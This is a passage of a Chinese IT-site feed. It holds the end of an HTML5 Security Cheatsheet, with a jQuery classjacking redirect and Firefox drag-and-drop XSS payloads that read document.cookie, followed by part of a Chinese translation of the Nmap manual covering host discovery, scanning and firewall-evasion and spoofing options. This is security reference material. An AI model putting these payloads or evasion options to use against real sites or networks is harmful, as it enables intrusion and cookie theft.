target="_blank" rel="external">http://example.org</a>“ and not “<a href="http://html5sec.org" target="_blank" rel="external">http://html5sec.org</a>“. This behaviour follows from the “href” attribute.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;span class=foo&#62;Some text&#60;/span&#62; &#60;a class=bar href=&#34;http://www.example.org&#34;&#62;www.example.org&#60;/a&#62; &#60;script src=&#34;http://code.jquery.com/jquery-1.4.4.js&#34;&#62;&#60;/script&#62; &#60;script&#62; $(&#34;span.foo&#34;).click(function() &#123; alert(&#39;foo&#39;); $(&#34;a.bar&#34;).click(); &#125;); $(&#34;a.bar&#34;).click(function() &#123; alert(&#39;bar&#39;); location=&#34;http://html5sec.org&#34;; &#125;); &#60;/script&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 10.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 2.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 8.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>clickjacking</p>
</li>
<li>classjacking</li>
<li>jQuery</li>
<li><p>class</p>
</li>
<li><p><a href="http://www.w3schools.com/Css/css_id_class.asp" target="_blank" rel="external">http://www.w3schools.com/Css/css_id_class.asp</a></p>
</li>
<li><a href="http://jquery.com/" target="_blank" rel="external">http://jquery.com/</a></li>
<li><a href="http://api.jquery.com/click/" target="_blank" rel="external">http://api.jquery.com/click/</a></li>
<li><a href="http://ui-redressing.mniemietz.de/uiRedressing.pdf" target="_blank" rel="external">http://ui-redressing.mniemietz.de/uiRedressing.pdf</a></li>
</ul>
<p>reporter：mniemietz</p>
<h3 id="Passive_XSS_via_Drag&amp;Drop_of_specially_crafted_URIs#131test">Passive XSS via Drag&amp;Drop of specially crafted URIs<a href="#131">#131</a><a href="test/#131">test</a></h3><p>It is possible to bypass Mozilla Firefox (tested on version 8.x and 9.x) internal protection and execute JavaScript Drag and Drop by using capitalization and Feed protocol, and to run that JavaScript on the top page if you can include the malicious page in an IFrame. The “event.preventDefault()” method in “ondragover” event of the element is to block the natural function of the browser. Usually the malicious IFrame should deceive the user to drag and drop a JS to the drop box which can be concealed in a hidden “Textarea” element.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;b&#62;drag and drop one of the following strings to the drop box:&#60;/b&#62; &#60;br/&#62;&#60;hr/&#62; jAvascript:alert(&#39;Top Page Location: &#39;+document.location+&#39; Host Page Cookies: &#39;+document.cookie);// &#60;br/&#62;&#60;hr/&#62; feed:javascript:alert(&#39;Top Page Location: &#39;+document.location+&#39; Host Page Cookies: &#39;+document.cookie);// &#60;br/&#62;&#60;hr/&#62; feed:data:text/html,&#38;#x3c;script&#62;alert(&#39;Top Page Location: &#39;+document.location+&#39; Host Page Cookies: &#39;+document.cookie)&#38;#x3c;/script&#62;&#38;#x3c;b&#62; &#60;br/&#62;&#60;hr/&#62; feed:feed:javAscript:javAscript:feed:alert(&#39;Top Page Location: &#39;+document.location+&#39; Host Page Cookies: &#39;+document.cookie);// &#60;br/&#62;&#60;hr/&#62; &#60;div id=&#34;dropbox&#34; style=&#34;height: 360px;width: 500px;border: 5px solid #000;position: relative;&#34; ondragover=&#34;event.preventDefault()&#34;&#62;+ Drop Box +&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 6</li>
<li><p>firefox 10.0.2</p>
</li>
<li><p>drag&amp;drop</p>
</li>
<li>html5</li>
<li>iframe</li>
<li>feed</li>
<li><p>firefox</p>
</li>
<li><p><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=704354" target="_blank" rel="external">https://bugzilla.mozilla.org/show_bug.cgi?id=704354</a></p>
</li>
<li><a href="http://soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/" target="_blank" rel="external">http://soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/</a></li>
</ul>
<p>reporter：irsdl</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>来源：<a href="https://html5sec.org/">HTML5 Security Cheatsheet</a></p>
</blockquote>]]>
    
    </summary>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Nmap 参考指南(Man Page)]]></title>
    <link href="http://it-ebooks.flygon.net/nmap-man-page/"/>
    <id>http://it-ebooks.flygon.net/nmap-man-page/</id>
    <published>2016-02-16T03:49:41.000Z</published>
    <updated>2016-02-16T04:16:04.700Z</updated>
    <content type="html"><![CDATA[<h2 id="Table_of_Contents">Table of Contents</h2><ul>
<li>描述</li>
<li>译注</li>
<li>选项概要</li>
<li>目标说明</li>
<li>主机发现</li>
<li>端口扫描基础</li>
<li>端口扫描技术</li>
<li>端口说明和扫描顺序</li>
<li>服务和版本探测</li>
<li>操作系统探测</li>
<li>时间和性能</li>
<li>防火墙/IDS</li>
<li>躲避和哄骗</li>
<li>输出</li>
<li>其它选项</li>
<li>运行时的交互</li>
<li>实例</li>
<li>Bugs</li>
<li>作者</li>
<li>法律事项（版权、许可证、担保、出口限制）</li>
<li>Unofficial Translation Disclaimer</li>
</ul>
<a id="more"></a>
<h3 id="Name">Name</h3><p>nmap — 网络探测工具和安全/端口扫描器</p>
<h3 id="Synopsis">Synopsis</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap [ &#25195;&#25551;&#31867;&#22411; ...] [ &#36873;&#39033; ] &#123; &#25195;&#25551;&#30446;&#26631;&#35828;&#26126; &#125;</span><br></pre></td></tr></table></figure>
<h2 id="一、_描述">一、 描述</h2><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。 它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap 以新颖的方式 使用原始 IP 报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那 些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然 Nmap 通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些 日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p>
<p>Nmap 输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的 选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。 状态可能是 open(开放的)，filtered(被过滤的)， closed(关闭的)，或者 unfiltered(未被过 滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接/报文。 filtered(被 过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap 无法得知 它是 open(开放的) 还是 closed(关闭的)。 closed(关闭的) 端口没有应用程序在它上面监听，但 是他们随时可能开放。 当端口对 Nmap 的探测做出响应，但是 Nmap 无法确定它们是关闭还是开 放时，这些端口就被认为是 unfiltered(未被过滤的) 如果 Nmap 报告状态组合 open|filtered 和 closed|filtered 时，那说明 Nmap 无法确定该端口处于两个状态中的哪一个状态。 当要求 进行版本探测时，端口表也可以包含软件的版本信息。当要求进行 IP 协议扫描时 (-sO)，Nmap 提供关于所支持的 IP 协议而不是正在监听的端口的信息。</p>
<p>除了所感兴趣的端口表，Nmap 还能提供关于目标机的进一步信息，包括反向域名，操作系统猜 测，设备类型，和 MAC 地址。</p>
<p>一个典型的 Nmap 扫描如 Example 1, “一个典型的 Nmap 扫描”所示。在这个例子中，唯一的选 项是-A， 用来进行操作系统及其版本的探测，-T4 可以加快执行速度，接着是两个目标主机名</p>
<h3 id="Example_1-_一个典型的_Nmap_扫描">Example 1. 一个典型的 Nmap 扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -A -T4 scanme.nmap.org playground&#10;&#10;[Starting nmap ( http://www.insecure.org/nmap/](http://www.insecure.org/nmap/) )&#10;Interesting ports on scanme.nmap.org (205.217.153.62):&#10;(The 1663 ports scanned but not shown below are in state: filtered)&#10;port STATE SERVICE VERSION&#10;22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)&#10;53/tcp open domain&#10;70/tcp closed gopher&#10;80/tcp open http Apache httpd 2.0.52 ((Fedora))&#10;113/tcp closed auth&#10;Device type: general purpose&#10;Running: Linux 2.4.X|2.5.X|2.6.X&#10;OS details: Linux 2.4.7 - 2.6.11&#65292;Linux 2.6.0 - 2.6.11&#10;Uptime 33&#12290;908 days (since Thu Jul 21 03:38:03 2005)&#10;&#10;Interesting ports on playground&#12290;nmap&#12290;&#25110;&#32773; g (192.168.0.40):&#10;(The 1659 ports scanned but not shown below are in state: closed)&#10;port STATE SERVICE VERSION&#10;135/tcp open msrpc Microsoft Windows RPC&#10;139/tcp open netbios-ssn&#10;389/tcp open ldap?&#10;![image](Nmap&#20013;&#25991;&#23448;&#26041;&#25991;&#26723;/Image_003.png)&#10;445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds&#10;1002/tcp open windows-icfw?&#10;1025/tcp open msrpc Microsoft Windows RPC&#10;1720/tcp open H.323/Q.931 CompTek AquaGateKeeper&#10;5800/tcp open vnc-http RealVNC 4.0 (Resolution 400x250; VNC TCP port: 5900)&#10;5900/tcp open vnc VNC (protocol 3.8)&#10;MAC Address: 00:A0:CC:63:85:4B (Lite-on Communications)&#10;Device type: general purpose&#10;Running: Microsoft Windows NT/2K/XP&#10;OS details: Microsoft Windows XP Pro RC1+ through final release&#10;Service Info: OSs: Windows&#65292;Windows XP&#10;&#10;Nmap finished: 2 IP addresses (2 hosts up) scanned in 88.392 seconds</span><br></pre></td></tr></table></figure>
<h2 id="二、_译注">二、 译注</h2><p>该 Nmap 参考指南中文版由 Fei Yang <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#102;&#121;&#97;&#110;&#x67;&#x31;&#x30;&#x32;&#x34;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#102;&#121;&#97;&#110;&#x67;&#x31;&#x30;&#x32;&#x34;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a> 和 Lei Li <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#58;&#108;&#x69;&#x6c;&#x65;&#x69;&#x5f;&#55;&#x32;&#49;&#x40;&#54;&#54;&#x31;&#49;&#46;&#x6f;&#x72;&#103;">&#108;&#x69;&#x6c;&#x65;&#x69;&#x5f;&#55;&#x32;&#49;&#x40;&#54;&#54;&#x31;&#49;&#46;&#x6f;&#x72;&#103;</a> 从 <a href="http://www.insecure.org/nmap/man/" target="_blank" rel="external">英文版本</a>翻译而来。我们希望这将使全世界使用中文的人们更了解 Nmap，但我们不能保证该译 本和官方的英文版本一样完整，也不能保证同步更新。它可以在 <a href="http://creativecommons.org/licenses/by/2.5/" target="_blank" rel="external">Creative Commons Attribution License</a> 下被修改并重新发布。</p>
<h2 id="三、_选项概要">三、 选项概要</h2><p>当 Nmap 不带选项运行时，该选项概要会被输出，最新的版本在这里 <a href="http://www.insecure.org/nmap/data/nmap.usage.txt" target="_blank" rel="external">http://www.insecure.org/nmap/data/nmap.usage.txt</a>。它帮助人们记住最常用的选项，但不 能替代本手册其余深入的文档，一些晦涩的选项甚至不在这里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;&#10;TARGET SPECIFICATION:&#10;    Can pass hostnames, IP addresses, networks, etc.&#10;    Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0-255.0-255.1-254&#10;    -iL &#60;inputfilename&#62;: Input from list of hosts/networks&#10;    -iR &#60;num hosts&#62;: Choose random targets&#10;    --exclude &#60;host1[,host2][,host3],...&#62;: Exclude hosts/networks&#10;    --excludefile &#60;exclude_file&#62;: Exclude list from file&#10;HOST DISCOVERY:&#10;    -sL: List Scan - simply list targets to scan&#10;    -sP: Ping Scan - go no further than determining if host is online&#10;    -P0: Treat all hosts as online -- skip host discovery&#10;    -PS/PA/PU [portlist]: TCP SYN/ACK or UDP discovery probes to given ports&#10;    -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes&#10;    -n/-R: Never do DNS resolution/Always resolve [default: sometimes resolve]&#10;SCAN TECHNIQUES:&#10;    -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans&#10;    -sN/sF/sX: TCP Null, FIN, and Xmas scans&#10;    --scanflags &#60;flags&#62;: Customize TCP scan flags&#10;    -sI &#60;zombie host[:probeport]&#62;: Idlescan&#10;    -sO: IP protocol scan&#10;    -b &#60;ftp relay host&#62;: FTP bounce scan&#10;PORT SPECIFICATION AND SCAN ORDER:&#10;    -p &#60;port ranges&#62;: Only scan specified ports&#10;    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080&#10;    -F: Fast - Scan only the ports listed in the nmap-services file)&#10;    -r: Scan ports consecutively - don&#39;t randomize&#10;SERVICE/VERSION DETECTION:&#10;    -sV: Probe open ports to determine service/version info&#10;    --version-light: Limit to most likely probes for faster identification&#10;    --version-all: Try every single probe for version detection&#10;    --version-trace: Show detailed version scan activity (for debugging)&#10;OS DETECTION:&#10;    -O: Enable OS detection&#10;    --osscan-limit: Limit OS detection to promising targets&#10;    --osscan-guess: Guess OS more aggressively&#10;TIMING AND PERFORMANCE:&#10;    -T[0-6]: Set timing template (higher is faster)&#10;    --min-hostgroup/max-hostgroup &#60;msec&#62;: Parallel host scan group sizes&#10;    --min-parallelism/max-parallelism &#60;msec&#62;: Probe parallelization&#10;    --min_rtt_timeout/max-rtt-timeout/initial-rtt-timeout &#60;msec&#62;: Specifies probe round trip time.&#10;    --host-timeout &#60;msec&#62;: Give up on target after this long&#10;    --scan-delay/--max_scan-delay &#60;msec&#62;: Adjust delay between probes&#10;FIREWALL/IDS EVASION AND SPOOFING:&#10;    -f; --mtu &#60;val&#62;: fragment packets (optionally w/given MTU)&#10;    -D &#60;decoy1,decoy2[,ME],...&#62;: Cloak a scan with decoys&#10;    -S &#60;IP_Address&#62;: Spoof source address&#10;    -e &#60;iface&#62;: Use specified interface&#10;    -g/--source-port &#60;portnum&#62;: Use given port number&#10;    --data-length &#60;num&#62;: Append random data to sent packets&#10;    --ttl &#60;val&#62;: Set IP time-to-live field&#10;    --spoof-mac &#60;mac address, prefix, or vendor name&#62;: Spoof your MAC address&#10;OUTPUT:&#10;    -oN/-oX/-oS/-oG &#60;file&#62;: Output scan results in normal, XML, s|&#60;rIpt kIddi3, and Grepable format, respectively, to the given filename.&#10;    -oA &#60;basename&#62;: Output in the three major formats at once&#10;    -v: Increase verbosity level (use twice for more effect)&#10;    -d[level]: Set or increase debugging level (Up to 9 is meaningful)&#10;    --packet-trace: Show all packets sent and received&#10;    --iflist: Print host interfaces and routes (for debugging)&#10;    --append-output: Append to rather than clobber specified output files&#10;    --resume &#60;filename&#62;: Resume an aborted scan&#10;    --stylesheet &#60;path/URL&#62;: XSL stylesheet to transform XML output to HTML&#10;    --no_stylesheet: Prevent Nmap from associating XSL stylesheet w/XML output&#10;MISC:&#10;    -6: Enable IPv6 scanning&#10;    -A: Enables OS detection and Version detection&#10;    --datadir &#60;dirname&#62;: Specify custom Nmap data file location&#10;    --send-eth/--send-ip: Send packets using raw ethernet frames or IP packets&#10;    --privileged: Assume that the user is fully privileged&#10;    -V: Print version number&#10;    -h: Print this help summary page.&#10;EXAMPLES:&#10;    nmap -v -A scanme.nmap.org&#10;    nmap -v -sP 192.168.0.0/16 10.0.0.0/8&#10;    nmap -v -iR 10000 -P0 -p 80</span><br></pre></td></tr></table></figure>
<h2 id="四、_目标说明">四、 目标说明</h2><p>除了选项，所有出现在 Nmap 命令行上的都被视为对目标主机的说明。最简单的情况是指定一个 目标 IP 地址或主机名。</p>
<p>有时候您希望扫描整个网络的相邻主机。为此，Nmap 支持 CIDR 风格的地址。您可以附加一个</p>
<p>/numbit 在一个 IP 地址或主机名后面， Nmap 将会扫描所有和该参考 IP 地址具有 numbit 相同 比特的所有 IP 地址或主机。例如，192.168.10.0/24 将会扫描 192.168.10.0 (二进制格式: 11000000 10101000 00001010 00000000)和 192.168.10.255 (二进制格式: 11000000 10101000</p>
<p>00001010 11111111)之间的 256 台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org 的 IP 地址是 205.217.153.62， scanme.nmap.org/16 将扫描 205.217.0.0 和 205.217.255.255 之间的 65,536 个 IP 地址。所允许的最小值是/1，这将会扫描半个互联网。 最大值是/32，这将会扫描该主机或 IP 地址，因为所有的比特都固定了。</p>
<p>CIDR 标志位很简洁但有时候不够灵活 例如 您也许想要扫描 192.168.0.0/16 但略过任何以.0 或者.255 结束的 IP 地址，因为它们通常是广播地址。 Nmap 通过八位字节地址范围支持这样的 扫描您可以用逗号分开的数字或范围列表为 IP 地址的每个八位字节指定它的范围。例如， 192.168.0-255.1-254 将略过在该范围内以.0 和.255 结束的地址。 范围不必限于最后的 8 位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以 13.37 结束的地址。这种大范围的扫描 对互联网调查研究也许有用。</p>
<p>IPv6 地址只能用规范的 IPv6 地址或主机名指定。 CIDR 和八位字节范围不支持 IPv6，因为它 们对于 IPv6 几乎没什么用。</p>
<p>Nmap 命令行接受多个主机说明，它们不必是相同类型。命令 <code>nmap scanme.nmap.org 192.168.0.0/8 10.0.0，1，3-7.0-255</code> 将和您预期的一样执行。</p>
<p>虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：</p>
<p><code>-iL &lt;inputfilename&gt;</code> (从列表中输入)</p>
<p>从 inputfilename 中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需 要这样。 例如，您的 DHCP 服务器可能导出 10,000 个当前租约的列表，而您希望对它们 进行 扫描。如果您不是使用未授权的静态 IP 来定位主机，或许您想要扫描所有 IP 地址 只要生成要扫描的主机的列表，用-iL 把文件名作为选项传给 Nmap。列表中的项可以是 Nmap 在 命令行上接受的任何格式(IP 地址，主机名，CIDR，IPv6，或者八位字节范围) 每一项必须以一个或多个空格，制表符或换行符分开。 如果您希望 Nmap 从标准输入而 不是实际文件读取列表， 您可以用一个连字符(-)作为文件名。</p>
<p><code>-iR &lt;hostnum&gt;</code> (随机选择目标)</p>
<p>对于互联网范围内的调查和研究， 您也许想随机地选择目标。 hostnum 选项告诉 Nmap 生成多少个 IP。不合需要的 IP 如特定的私有，组播或者未分配的地址自动 略过。选项 0 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。使 用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令 nmap <code>-sS -PS80 -iR 0 -p 80</code> 随机地找一些网站浏览。</p>
<p><code>--exclude &lt;host1[，host2][，host3]，...&gt;</code> (排除主机/网络) 如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的 Nmap 语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反 应强烈的 系统或者被其它人看管的子网时，这也许有用。</p>
<p><code>--excludefile &lt;excludefile&gt;</code> (排除文件中的列表)</p>
<p>这和–exclude 选项的功能一样，只是所排除的目标是用以 换行符，空格，或者制表符 分隔的 excludefile 提供的，而不是在命令行上输入的。</p>
<h2 id="五、_主机发现">五、 主机发现</h2><p>任何网络探测任务的最初几个步骤之一就是把一组 IP 范围(有时该范围是巨大的)缩小为 一列 活动的或者您感兴趣的主机。扫描每个 IP 的每个端口很慢，通常也没必要。 当然，什么样的 主机令您感兴趣主要依赖于扫描的目的。网管也许只对运行特定服务的 主机感兴趣，而从事安 全的人士则可能对一个马桶都感兴趣，只要它有 IP 地址:-)。一个系统管理员 也许仅仅使用 Ping 来定位内网上的主机 而一个外部入侵测试人员则可能绞尽脑汁用各种方法试图 突破防火 墙的封锁。</p>
<p>由于主机发现的需求五花八门，Nmap 提供了一箩筐的选项来定制您的需求。 主机发现有时候也 叫做 ping 扫描，但它远远超越用世人皆知的 ping 工具 发送简单的 ICMP 回声请求报文。用户 完全可以通过使用列表扫描(-sL)或者 通过关闭 ping (-P0)跳过 ping 的步骤，也可以使用多个端口把 TPC SYN/ACK，UDP 和 ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某 个 IP 地址是否是活动的(正在被某 主机或者网络设备使用)。 在许多网络上，在给定的时间， 往往只有小部分的 IP 地址是活动的。 这种情况在基于 RFC1918 的私有地址空间如 10.0.0.0/8 尤其普遍。 那个网络有 16,000,000 个 IP，但我见过一些使用它的公司连 1000 台机器都没有 主机发现能够找到零星分布于 IP 地址海洋上的那些机器。</p>
<p>如果没有给出主机发现的选项，Nmap 就发送一个 TCP ACK 报文到 80 端口和一个 ICMP 回声请求 到每台目标机器。 一个例外是 ARP 扫描用于局域网上的任何目标机器。对于非特权 UNIX shell 用户，使用 connect()系统调用会发送一个 SYN 报文而不是 ACK 这些默认行为和使用<code>-PA -PE</code> 选项的效果相同。 扫描局域网时，这种主机发现一般够用了，但是对于安全审核，建议进行 更 加全面的探测。</p>
<p><code>-P*</code>选项(用于选择 ping 的类型)可以被结合使用。 您可以通过使用不同的 TCP 端口/标志位和 ICMP 码发送许多探测报文 来增加穿透防守严密的防火墙的机会 另外要注意的是即使您指定了 其它 <code>-P*</code>选项，ARP 发现(<code>-PR</code>)对于局域网上的 目标而言是默认行为，因为它总是更快更有效</p>
<p>下列选项控制主机发现。</p>
<p><code>-sL</code> (列表扫描)</p>
<p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文 到目标主机。默认情况下，Nmap 仍然对主机进行反向域名解析以获取 它们的名字。简单 的主机名能给出的有用信息常常令人惊讶。例如， fw.chi.playboy.com 是花花公子芝加 哥办公室的 防火墙。Nmap 最后还会报告 IP 地址的总数。列表扫描可以很好的确保您拥 有正确的目标 IP。 如果主机的域名出乎您的意料，那么就值得进一步检查以防错误地扫 描其它组织的网络。</p>
<p>既然只是打印目标主机的列表 像其它一些高级功能如端口扫描 操作系统探测或者 Ping 扫描 的选项就没有了。如果您希望关闭 ping 扫描而仍然执行这样的高级功能，请继续 阅读关于 -P0 选项的介绍。</p>
<p><code>-sP</code> (Ping 扫描)</p>
<p>该选项告诉 Nmap 仅仅 进行 ping 扫描 (主机发现)，然后打印出对扫描做出响应的那些 主机。 没有进一步的测试 (如端口扫描或者操作系统探测)。 这比列表扫描更积极，常 常用于 和列表扫描相同的目的。它可以得到些许目标网络的信息而不被特别注意到。 对 于攻击者来说 了解多少主机正在运行比列表扫描提供的一列 IP 和主机名往往更有价值</p>
<p>系统管理员往往也很喜欢这个选项。 它可以很方便地得出 网络上有多少机器正在运行 或者监视服务器是否正常运行。常常有人称它为 地毯式 ping，它比 ping 广播地址更可 靠，因为许多主机对广播请求不响应。</p>
<p><code>-sP</code> 选项在默认情况下， 发送一个 ICMP 回声请求和一个 TCP 报文到 80 端口。如果非特 权用户执行，就发送一个 SYN 报文 (用 connect()系统调用)到目标机的 80 端口。 当特 权用户扫描局域网上的目标机时，会发送 ARP 请求(<code>-PR</code>)， ，除非使用了<code>--send-ip</code> 选项</p>
<p><code>-sP</code> 选项可以和除-P0)之外的任何发现探测类型-P* 选项结合使用以达到更大的灵活性 一旦使用了任何探测类型和端口选项，默认的探测(ACK 和回应请求)就被覆盖了。 当防 守严密的防火墙位于运行 Nmap 的源主机和目标网络之间时， 推荐使用那些高级选项。 否则，当防火墙捕获并丢弃探测包或者响应包时，一些主机就不能被探测到。</p>
<p><code>-P0</code> (无 ping)</p>
<p>该选项完全跳过 Nmap 发现阶段。 通常 Nmap 在进行高强度的扫描时用它确定正在运行的 机器。 默认情况下，Nmap 只对正在运行的主机进行高强度的探测如 端口扫描，版本探 测，或者操作系统探测。用-P0 禁止 主机发现会使 Nmap 对每一个指定的目标 IP 地址 进 行所要求的扫描。所以如果在命令行指定一个 B 类目标地址空间(/16)， 所有 65,536 个 IP 地址都会被扫描。 -P0 的第二个字符是数字 0 而不是字母 O。 和列表扫描一样，跳过 正常的主机发现，但不是打印一个目标列表， 而是继续执行所要求的功能，就好像每个 IP 都是活动的。</p>
<p><code>-PS [portlist]</code> (TCP SYN Ping)</p>
<p>该选项发送一个设置了 SYN 标志位的空 TCP 报文。 默认目的端口为 80 (可以通过改变 nmap.h) 文件中的 DEFAULT_TCP_PROBE_PORT 值进行配置，但不同的端口也可以作为选项 指定。 甚至可以指定一个以逗号分隔的端口列表(如 <code>-PS22，23，25，80，113，1050， 35000</code>)， 在这种情况下，每个端口会被并发地扫描。</p>
<p>SYN 标志位告诉对方您正试图建立一个连接。 通常目标端口是关闭的，一个 RST (复位) 包会发回来。 如果碰巧端口是开放的，目标会进行 TCP 三步握手的第二步，回应 一个 SYN/ACK TCP 报文。然后运行 Nmap 的机器则会扼杀这个正在建立的连接， 发送一个 RST 而非 ACK 报文，否则，一个完全的连接将会建立。 RST 报文是运行 Nmap 的机器而不是 Nmap 本身响应的，因为它对收到 的 SYN/ACK 感到很意外。</p>
<p>Nmap 并不关心端口开放还是关闭。 无论 RST 还是 SYN/ACK 响应都告诉 Nmap 该主机正在 运行。</p>
<p>在 UNIX 机器上，通常只有特权用户 root 能否发送和接收 原始的 TCP 报文。因此作为 一个变通的方法，对于非特权用户， Nmap 会为每个目标主机进行系统调用 connect()， 它也会发送一个 SYN 报文来尝试建立连接。如果 connect()迅速返回成功或者一个 ECONNREFUSED 失败，下面的 TCP 堆栈一定已经收到了一个 SYN/ACK 或者 RST，该主机将 被 标志位为在运行。 如果连接超时了，该主机就标志位为 down 掉了。这种方法也用于 IPv6 连接，因为 Nmap 目前还不支持原始的 IPv6 报文。</p>
<p><code>-PA [portlist]</code> (TCP ACK Ping)</p>
<p>TCP ACK ping 和刚才讨论的 SYN ping 相当类似。 也许您已经猜到了，区别就是设置 TCP 的 ACK 标志位而不是 SYN 标志位。 ACK 报文表示确认一个建立连接的尝试，但该连接尚 未完全建立。 所以远程主机应该总是回应一个 RST 报文， 因为它们并没有发出过连接 请求到运行 Nmap 的机器，如果它们正在运行的话。</p>
<p><code>-PA</code> 选项使用和 SYN 探测相同的默认端口(80) 也可以 用相同的格式指定目标端口列表 如果非特权用户尝试该功能， 或者指定的是 IPv6 目标，前面说过的 connect()方法将被 使用。 这个方法并不完美，因为它实际上发送的是 SYN 报文，而不是 ACK 报文。</p>
<p>提供 SYN 和 ACK 两种 ping 探测的原因是使通过防火墙的机会尽可能大。 许多管理员会 配置他们的路由器或者其它简单的防火墙来封锁 SYN 报文，除非 连接目标是那些公开的 服务器像公司网站或者邮件服务器。 这可以阻止其它进入组织的连接，同时也允许用户 访问互联网。 这种无状态的方法几乎不占用防火墙/路由器的资源，因而被硬件和软件 过滤器 广泛支持。Linux Netfilter/iptables 防火墙软件提供方便的 –syn 选项来实 现这种无状态的方法。 当这样的无状态防火墙规则存在时，发送到关闭目标端口的 SYN ping 探测 (-PS) 很可能被封锁。这种情况下，ACK 探测格外有闪光点，因为它正好利用 了 这样的规则。</p>
<p>另外一种常用的防火墙用有状态的规则来封锁非预期的报文。 这一特性已开始只存在于 高端防火墙，但是这些年类它越来越普遍了。 Linux Netfilter/iptables 通过 <code>--state</code> 选项支持这一特性，它根据连接状态把报文 进行分类。SYN 探测更有可能用于这样的系 统，由于没头没脑的 ACK 报文 通常会被识别成伪造的而丢弃。解决这个两难的方法是通 过即指定 <code>-PS</code> 又指定<code>-PA</code> 来即发送 SYN 又发送 ACK。</p>
<p><code>-PU [portlist]</code> (UDP Ping)</p>
<p>还有一个主机发现的选项是 UDP ping，它发送一个空的(除非指定了–data-length UDP 报文到给定的端口。端口列表的格式和前面讨论过的-PS 和-PA 选项还是一样。 如果不 指定端口，默认是 31338。该默认值可以通过在编译时改变 nmap.h 文件中的 DEFAULT_UDP_PROBE_PORT 值进行配置。默认使用这样一个奇怪的端口是因为对开放端口 进行这种扫描一般都不受欢迎。</p>
<p>如果目标机器的端口是关闭的，UDP 探测应该马上得到一个 ICMP 端口无法到达的回应报 文。 这对于 Nmap 意味着该机器正在运行。 许多其它类型的 ICMP 错误，像主机/网络无 法到达或者 TTL 超时则表示 down 掉的或者不可到达的主机。 没有回应也被这样解释。 如果到达一个开放的端口，大部分服务仅仅忽略这个 空报文而不做任何回应。这就是为 什么默认探测端口是 31338 这样一个 极不可能被使用的端口。少数服务如 chargen 会响 应一个空的 UDP 报文， 从而向 Nmap 表明该机器正在运行。</p>
<p>该扫描类型的主要优势是它可以穿越只过滤 TCP 的防火墙和过滤器。 例如。我曾经有过 一个 Linksys BEFW11S4 无线宽带路由器。默认情况下， 该设备对外的网卡过滤所有 TCP 端口，但 UDP 探测仍然会引发一个端口不可到达 的消息，从而暴露了它自己。</p>
<p><code>-PE; -PP; -PM</code> (ICMP Ping Types)</p>
